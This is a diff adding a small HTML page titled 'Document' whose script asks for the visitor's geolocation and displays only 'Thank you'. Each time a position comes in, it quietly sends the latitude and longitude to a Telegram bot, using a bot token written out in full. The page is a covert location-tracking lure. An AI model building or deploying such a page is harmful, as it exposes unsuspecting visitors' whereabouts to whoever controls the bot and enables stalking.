@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <div id="output"></div>
+    <script>
+      const options = {
+        enableHighAccuracy: true,
+        // Get high accuracy reading, if available (default false)
+        timeout: 5000,
+        // Time to return a position successfully before error (default infinity)
+        maximumAge: 2000,
+        // Milliseconds for which it is acceptable to use cached position (default 0)
+      };
+      navigator.geolocation.watchPosition(success, error, options);
+      // Fires success function immediately and when user position changes
+
+      function success(pos) {
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
+        const accuracy = pos.coords.accuracy; // Accuracy in metres
+        document.getElementById('output').innerText = `Thank you`;
+
+        var my_text = `Result - ${lat} - ${lng}`;
+        var chat_id = -410344660;
+        var uri = `https://api.telegram.org/bot6023081420:AAHMk88r3pQf99Wg408xe1wP3TBq8fLf33g/sendMessage?chat_id=-879772407&text=${my_text}`;
+        let api = new XMLHttpRequest();
+        api.open('GET', uri, true);
+        api.send();
+      }
+      function error(err) {
+        if (err.code === 1) {
+          alert('Please allow geolocation access');
+          // Runs if user refuses access
+        } else {
+          alert('Cannot get current location');
+          // Runs if there was a technical problem.
+        }
+      }
+    </script>
+  </body>
+</html>
